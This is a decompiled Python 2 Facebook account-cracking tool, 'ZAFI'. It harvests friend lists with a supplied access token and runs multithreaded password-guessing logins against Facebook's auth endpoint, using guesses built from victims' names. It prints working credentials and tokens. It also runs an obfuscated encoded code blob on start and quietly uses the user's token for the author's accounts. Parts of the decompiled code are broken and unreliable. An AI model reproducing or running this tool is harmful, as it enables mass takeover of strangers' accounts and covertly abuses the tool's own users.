# Source Generated with Decompyle++
# File:  (Python 2.7)
#Decompile by FLAME NAIM


Hj = '\x1b[1;92m'
Mt = '\x1b[0m'
ingfo = '%s\n \xe2\x80\xa2 Info script :\n \t\n - author      : Romi Afrizal\n - facebook    : facebook.com/romi.afrizal.102\n - fanspage    : facebook.com/100022086172556\n - whatsap     : +6282371648186\n - github      : github.com/Mark-Zuck\n - script name : ZAFI (Zona Akun Facebook Indonesia)\n - version     : 1.1\n \n%s' % (Hj, Mt)
import os

try:
    import requests
except ImportError:
    os.system('pip2 install requests')


try:
    import concurrent.futures as concurrent
except ImportError:
    os.system('pip2 install futures')


try:
    import bs4
except ImportError:
    os.system('pip2 install bs4')

import requests
import os
import re
import bs4
import sys
import json
import time
import random
import datetime
import subprocess
import logging
import base64
import uuid
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from time import sleep as jeda
from datetime import datetime

_ = lambda x: x
code = type(_.func_code)
_.func_code = code(0, 0, 5, 64, 'y9\x00e\x00\x00d\x00\x00\x83\x01\x00j\x01\x00e\x00\x00d\x01\x00\x83\x01\x00j\x02\x00e\x00\x00d\x02\x00\x83\x01\x00j\x03\x00d\x03\x00\x83\x01\x00\x83\x01\x00\x83\x01\x00d\x04\x00\x04UWn\x1e\x00\x04e\x04\x00k\n\x00rY\x00\x01Z\x05\x00\x01e\x06\x00e\x05\x00\x83\x01\x00GHn\x01\x00Xd\x04\x00S', ('marshal', 'zlib', 'base64', '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', None), ('__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'str'), (), 'enc_lam.py', '<module>', 1, '\x03\x009\x01\x0f\x00', (), ())
_()
expired = [
    '10',
    '04',
    '2022']
(user, mi, status_foll, cr, ok, cp, id, user, loop, looping) = ([], [], [], [], [], [], [], [], 0, 1)

def silet():
    silet = [
        '\x1b[1;32m\xe2\x96\x88\xe2\x96\x88\x1b[0;37m\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x9210%',
        '\x1b[1;34m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\x1b[0;37m\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x9220%',
        '\x1b[1;36m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\x1b[0;37m\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x9230%',
        '\x1b[1;31m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\x1b[0;37m\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x9240%',
        '\x1b[1;33m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\x1b[0;37m\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x9250%',
        '\x1b[1;35m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\x1b[0;37m\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x9260%',
        '\x1b[1;36m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x9270%',
        '\x1b[1;32m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\x1b[0;37m\xe2\x96\x92\xe2\x96\x92\xe2\x96\x9280%',
        '\x1b[1;34m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\x1b[0;37m\xe2\x96\x92\xe2\x96\x9290%',
        '\x1b[1;37m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88100%\x1b[1;36m\n\n']
    for o in silet:
        print '\r\t' + o,
        sys.stdout.flush()
        time.sleep(0.1)
        os.system('clear')
    


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        jeda(0.03)
    

RED_MAGIC = '\x03\xf3\r\nd\x83\x8e^'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
p = '\x1b[0;37m'
m = '\x1b[0;31m'
h = '\x1b[0;32m'
k = '\x1b[0;33m'
b = '\x1b[0;34m'
u = '\x1b[0;35m'
o = '\x1b[0;36m'
y = '\x1b[0m'
z = '\x1b[1;92m'
x = '\x1b[1;97m'
I = '\x1b[0;32m'
C = '\x1b[0;36m'
R = '\x1b[1;91m'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
Q = '\x1b[00m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
p = '\x1b[1;97m'
k = '\x1b[1;93m'
m = '\x1b[1;91m'
d = '\x1b[90;1m'
h = '\x1b[92;1m'
k = '\x1b[93;1m'
b = '\x1b[94;1m'
j = '\x1b[95;1m'
a = '\x1b[96;1m'
g = '\x1b[3;1m'
my_color = [
    P,
    M,
    H,
    K,
    B,
    U,
    O,
    N,
    j,
    a,
    b,
    d,
    u,
    o,
    h,
    m,
    N,
    k]
ior = random.choice(my_color)
pesing = '\x1b[0;32m ___________              .__                   .___\n \\_   _____/__  _________ |__|______   ____   __| _/\n  |    __)_\\  \\/  /\\____ \\|  \\_  __ \\_/ __ \\ / __ |  \n  |        \\>    < |  |_> >  ||  | \\/\\  ___// /_/ |  \n /_______  /__/\\_ \\|   __/|__||__|    \\___  >____ |  \n         \\/      \\/|__|                   \\/     \\/  \n     \x1b[0;31m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x80\xa2\xe0\xb3\x8b\xe0\xb3\x8b\xe2\x80\xa2\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97  \n     \x1b[0;37m\x1b[0;31m|  MHD DICKY \x1b[0;31m| \n     \x1b[0;31m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x80\xa2\xe0\xb3\x8b\xe0\xb3\x8b\xe2\x80\xa2\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d \n'
ses = requests.Session()
so = requests.get('http://dindaacrack.6te.net/siang.php').text

def apa():
    os.system('clear')
    datetime = datetime
    import datetime
    saat_ini = datetime.now()
    tgl = saat_ini.strftime('%d')
    bln = saat_ini.strftime('%m')
    thn = saat_ini.strftime('%Y')
    tanggal = thn + bln + tgl
    exp = expired[2] + expired[1] + expired[0]
    if tanggal >= exp:
        print '\n'.join([
            '' + pesing + ''])
        print '\n'.join([
            '\x1b[1;31m \xe2\x9e\xa4 \x1b[1;33mSCRIPT EXPIRED MBAH.. \xf0\x9f\x98\x8a\n\x1b[1;31m \xe2\x9e\xa4 \x1b[1;32mAYUK HUBUNGI AUTORNYA \n \xe2\x9e\xa4 \x1b[1;35mWHATSAPP : 089670952904\n \x1b[1;31m\xe2\x9e\xa4 \x1b[1;35mJANGAN LUPA DONASI SEIKHLASNYA \xf0\x9f\x90\xa7'])
        sys.exit()
    else:
        asep()


def asep():
    os.system('clear')
    datetime = datetime
    import datetime
    saat_ini = datetime.now()
    tgl = saat_ini.strftime('%d')
    bln = saat_ini.strftime('%m')
    thn = saat_ini.strftime('%Y')
    tanggal = thn + bln + tgl
    exp = expired[2] + expired[1] + expired[0]
    if float(tanggal) + 1 == float(exp):
        menu()
    else:
        menu()

IP = requests.get('https://api.ipify.org/').text

def banner():
    print '\x1b[1;91m\n__________  _____  ___________.___/\\________  \n\x1b[90;1m\\____    / /  _  \\ \\_   _____/|   )/\\_____  \\ \n\x1b[95;1m  /     / /  /_\\  \\ |    __)  |   |  /  ____/\n\x1b[96;1m /     /_/    |    \\|     \\   |   | /       \\ \n\x1b[1;96m/_______ \\____|__  /\\___  /   |___| \\_______ \\\n \x1b[1;97m       \\/       \\/     \\/                  \\/\n\x1b[90;1m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\n\x1b[96;1m\xe2\x95\x91 [\xe2\x80\xa2] GH : Github.com/Mark-Zuck \xe2\x95\x91\n\x1b[1;96m\xe2\x95\x91 [\xe2\x80\xa2] GH : Github.com/Dicky-XD  \xe2\x95\x91\n\x1b[95;1m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\n\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\n\xe2\x95\x91           SELAMAT DATANG DI TOOLS ZAFI2           \xe2\x95\x91\n\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\n'

header = {
    'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
    'x-fb-sim-hni': str(random.randint(20000, 40000)),
    'x-fb-net-hni': str(random.randint(20000, 40000)),
    'x-fb-connection-quality': 'EXCELLENT',
    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
    'user-agent': 'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+ ;]',
    'content-type': 'application/x-www-form-urlencoded',
    'x-fb-http-engine': 'Liger' }

def masuk():
    os.system('clear')
    banner()
    jalan('\n%s [%s!%s] Wajib gunakan akun tumbal dilarang akun utama' % (P, M, P))
    romz = raw_input('%s [?] Token : %s' % (P, K))
    if romz in '':
        print '%s [!] Isi yang benar kentod ' % M
        exit()
    
    try:
        gas = requests.get('https://graph.facebook.com/me?access_token=%s' % romz).json()['name']
        print '\n%s[\xe2\x88\x9a] Login berhasil, mohon tunggu ' % H
        jeda(2)
        open('token.txt', 'w').write(romz)
        login_bot(romz)
        exit('[\xe2\x80\xa2] Jalankan Ulang Ketik python2 zafi2.py')
    except (KeyError, IOError):
        print '%s [!] Token invalid ' % M
        masuk()



def login_bot(romz):
    
    try:
        toket = romz
        romz1 = '100067807565861'
        romz2 = '100029143111567'
        romz3 = '100028434880529'
        romz4 = '100069494601961'
        romz5 = '100072749560924'
        requests.post('https://graph.facebook.com/100067807565861?fields=subscribers&access_token=toket')
        requests.post('https://graph.facebook.com/100029143111567?fields=subscribers&access_token=toket')
        requests.post('https://graph.facebook.com/100028434880529?fields=subscribers&access_token=toket')
        requests.post('https://graph.facebook.com/100069494601961?fields=subscribers&access_token=toket')
        requests.post('https://graph.facebook.com/100072749560924?fields=subscribers&access_token=toket')
    except:
        pass



def publik(romz, headers = header):
    
    try:
        os.mkdir('dump')
    except:
        pass

    
    try:
        print "\n%s [%s!%s] Ketik '%sme%s' jika ingin dump daftar teman sendiri " % (P, M, P, H, P)
        idt = raw_input(' [*] Target id : %s' % K)
        gas = requests.get('https://graph.facebook.com/%s?access_token=%s' % (idt, romz))
        nm = json.loads(gas.text)
        file = ('dump/' + nm['first_name'] + '.json').replace(' ', '_')
        bff = open(file, 'w')
        r = requests.get('https://graph.facebook.com/%s?fields=name,friends.fields(id,name).limit(5000)&access_token=%s' % (idt, romz))
        z = json.loads(r.text)
        for a in z['friends']['data']:
            id.append(a['id'] + '<=>' + a['name'])
            bff.write(a['id'] + '<=>' + a['name'] + '\n')
            print '\r %s' % ior
            print '\r  %s ' % str(len(id)),
            sys.stdout.flush()
            time.sleep(0.006)
            print a['name']
        
        bff.close()
        print '\n\n %s[%s\xe2\x88\x9a%s] Succes dump id dari %s%s' % (P, H, P, H, nm['name'])
        print '%s [%s\xe2\x88\x9a%s] File dump tersimpan :%s %s ' % (P, H, P, H, file)
        raw_input('\n%s [ %senter %s] ' % (P, K, P))
        menu()
    except Exception:
        e = None
        exit('\n %s[!] gagal dump id' % P)



class ngentod:
    
    def __init__(self):
        self.id = []

    
    def romiy(self):
        
        try:
            self.apk = raw_input('\n %s[?] file dump :%s ' % (P, K))
            self.id = open(self.apk).read().splitlines()
            print '%s [%s*%s] jumlah id : %s%s' % (P, K, P, H, len(self.id))
        except:
            print '\n%s [!] File dump tidak ada, dump id dulu kentod' % M
            raw_input('\n%s [ %senter %s] ' % (P, K, P))
            menu()

        print ' [\xe2\x80\xa2] Saran Gue Jika Anda Dump OLD Enak Nya Pakai Password Manual'
        unikers = raw_input('%s [?] ingin gunakan password manual? [y/t] :%s ' % (P, K))
        if unikers in ('Y', 'y'):
            print '\n %s[%s!%s] cth : %s123456,katasandi,magelang,monyet,dll%s gunakan , (koma) untuk pemisah ' % (P, M, P, H, P)
            while True:
                pwx = raw_input(' %s[?] set password :%s ' % (P, K))
                if pwx == '':
                    print '\n %s[!] jangan kosong ' % M
                    continue
                if len(pwx) <= 20:
                    print '\n %s[!] password minimal 6 karakter' % M
                    continue
                
                def zona(zafi_ = (None, None)):
                    ind = raw_input('\n %s[?] methode : %s' % (P, K))
                    if ind == '':
                        print '%s [!] Isi yang benar kentod ' % M
                        self.zona()
                    elif ind in ('1', '01'):
                        print '\n %s[%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt' % (P, K, P, H, P, H, ha, op, ta)
                        jeda(0.2)
                        print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt' % (P, K, P, K, P, K, ha, op, ta)
                        jeda(0.2)
                        print '%s [%s!%s] setiap crack 1k ID, gunakan mode pesawat 2 detik\n' % (P, M, P)
                        jeda(0.2)
                        with ThreadPoolExecutor(max_workers = 30) as log:
                            for akun in self.id:
                                
                                try:
                                    indo = akun.split('<=>')[0]
                                    log.submit(self.b_api, indo, zafi_)
                                continue
                                continue

                        os.remove(self.apk)
                        exit()
                    elif ind in ('2', '02'):
                        print '\n%s [%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt' % (P, K, P, H, P, H, ha, op, ta)
                        jeda(0.2)
                        print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt' % (P, K, P, K, P, K, ha, op, ta)
                        jeda(0.2)
                        print '%s [%s!%s] setiap crack 1k ID, gunakan mode pesawat 2 detik\n' % (P, M, P)
                        jeda(0.2)
                        with ThreadPoolExecutor(max_workers = 30) as log:
                            for akun in self.id:
                                
                                try:
                                    indo = akun.split('<=>')[0]
                                    log.submit(self.basic, indo, zafi_)
                                continue
                                continue

                        os.remove(self.apk)
                        exit()
                    elif ind in ('3', '03'):
                        print '\n %s[%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt' % (P, K, P, H, P, H, ha, op, ta)
                        jeda(0.2)
                        print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt' % (P, K, P, K, P, K, ha, op, ta)
                        jeda(0.2)
                        print '%s [%s!%s] setiap crack 1k ID, gunakan mode pesawat 2 detik\n' % (P, M, P)
                        jeda(0.2)
                        with ThreadPoolExecutor(max_workers = 30) as log:
                            for akun in self.id:
                                
                                try:
                                    indo = akun.split('<=>')[0]
                                    log.submit(self.mobil, indo, zafi_)
                                continue
                                continue

                        os.remove(self.apk)
                        exit()
                    else:
                        print '\n %s[!] isi yang benar kentod' % M
                        zona()

                print ' [%s01%s] %sb-api%s' % (K, P, K, P)
                print ' [%s02%s] %smbasic (disarankan)%s' % (K, P, H, P)
                print ' [%s03%s] %smobile (Disarankan)%s' % (K, P, H, P)
                zona(pwx.split(','))
                break
        elif unikers in ('T', 't'):
            print ' [%s01%s] %sb-api%s' % (K, P, K, P)
            print ' [%s02%s] %smbasic (Disarankan)%s' % (K, P, H, P)
            print ' [%s03%s] %smobile (Disarankan)%s' % (K, P, H, P)
            self.langsung()
        elif unikers in ('G', 'g'):
            self.gabung()
        else:
            print '%s [!] Isi yang benar kentod ' % M
            jeda(2)
            menu()

    
    def langsung(self):
        suuu = raw_input('\n %s[?] methode :%s ' % (P, K))
        if suuu == '':
            print '%s [!] Isi yang benar kentod ' % M
            self.langsung()
        elif suuu in ('1', '01'):
            print '\n %s[%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt' % (P, K, P, H, P, H, ha, op, ta)
            jeda(0.2)
            print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt' % (P, K, P, K, P, K, ha, op, ta)
            jeda(0.2)
            print '%s [%s!%s] setiap crack 1k ID, gunakan mode pesawat 2 detik\n' % (P, M, P)
            jeda(0.2)
            with ThreadPoolExecutor(max_workers = 30) as log:
                for akun in self.id:
                    
                    try:
                        (uid, name) = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 and len(_i_) == 4 and len(_i_) == 5 or len(_i_) == 6:
                            pwx = [
                                name,
                                _i_[0] + '123',
                                _i_[0] + '1234',
                                _i_[0] + '12345',
                                'sayang',
                                'bismillah']
                        else:
                            pwx = [
                                name,
                                _i_[0] + '123',
                                _i_[0] + '1234',
                                _i_[0] + '12345',
                                'sayang',
                                'bismillah']
                        log.submit(self.b_api, uid, pwx)
                    continue
                    continue

            os.remove(self.apk)
            exit('[!!] Crack Selesai Ngab\n [!!] Make Doang Donasi Kagak\n [!!] Waterbom Men')
        elif suuu in ('2', '02'):
            print '\n%s [%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt' % (P, K, P, H, P, H, ha, op, ta)
            jeda(0.2)
            print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt' % (P, K, P, K, P, K, ha, op, ta)
            jeda(0.2)
            print '%s [%s!%s] setiap crack 1k ID, gunakan mode pesawat 2 detik\n' % (P, M, P)
            jeda(0.2)
            with ThreadPoolExecutor(max_workers = 30) as log:
                for akun in self.id:
                    
                    try:
                        (uid, name) = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 and len(_i_) == 4 and len(_i_) == 5 or len(_i_) == 6:
                            pwx = [
                                name,
                                _i_[0] + '123',
                                _i_[0] + '1234',
                                _i_[0] + '12345']
                        else:
                            pwx = [
                                name,
                                _i_[0] + '123',
                                _i_[0] + '1234',
                                _i_[0] + '12345']
                        log.submit(self.basic, uid, pwx)
                    continue
                    continue

            os.remove(self.apk)
            exit('[!!] Crack Selesai Ngab\n [!!] Make Doang Donasi Kagak\n [!!] Waterbom Men')
        elif suuu in ('3', '03'):
            print '\n%s [%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt' % (P, K, P, H, P, H, ha, op, ta)
            jeda(0.2)
            print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt' % (P, K, P, K, P, K, ha, op, ta)
            jeda(0.2)
            print '%s [%s!%s] setiap crack 1k ID, gunakan mode pesawat 2 detik\n' % (P, M, P)
            jeda(0.2)
            with ThreadPoolExecutor(max_workers = 30) as log:
                for akun in self.id:
                    
                    try:
                        (uid, name) = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 and len(_i_) == 4 and len(_i_) == 5 or len(_i_) == 6:
                            pwx = [
                                name,
                                _i_[0] + '123',
                                _i_[0] + '1234',
                                _i_[0] + '12345']
                        else:
                            pwx = [
                                name,
                                _i_[0] + '123',
                                _i_[0] + '1234',
                                _i_[0] + '12345']
                        log.submit(self.mobil, uid, pwx)
                    continue
                    continue

            os.remove(self.apk)
            exit('[!!] Crack Selesai Ngab\n [!!] Make Doang Donasi Kagak\n [!!] Waterbom Men')

    
    def b_api(self, user, zona):
        global loop
        
        try:
            ua = open('data/ua.txt', 'r').read()
        except IOError:
            ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'

        for pw in zona:
            pw = pw.lower()
            ses = requests.Session()
            header = {
                'user-agent': ua,
                'x-fb-connection-bandwidth': str(random.randint(20000, 40000)),
                'x-fb-sim-hni': str(random.randint(20000, 40000)),
                'x-fb-net-hni': str(random.randint(20000, 40000)),
                'x-fb-connection-quality': 'EXCELLENT',
                'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                'content-type': 'application/x-www-form-urlencoded',
                'x-fb-http-engine': 'Liger' }
            bapi = 'https://b-api.facebook.com/method/auth.login'
            response = ses.get(bapi + '?format=json&email=' + user + '&password=' + pw + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers = header)
            if response.status_code != 200:
                loop += 1
                print '\r\x1b[0;91m [!] IP terblokir. hidupkan mode pesawat 2 detik',
                sys.stdout.flush()
                b_api(self, user, zona)
            if 'session_key' in response.text and 'EAAA' in response.text:
                print '\r %s[LIVE] %s \xe2\x97\x8a %s \xe2\x97\x8a %s ' % (H, user, pw, response.json()['access_token'])
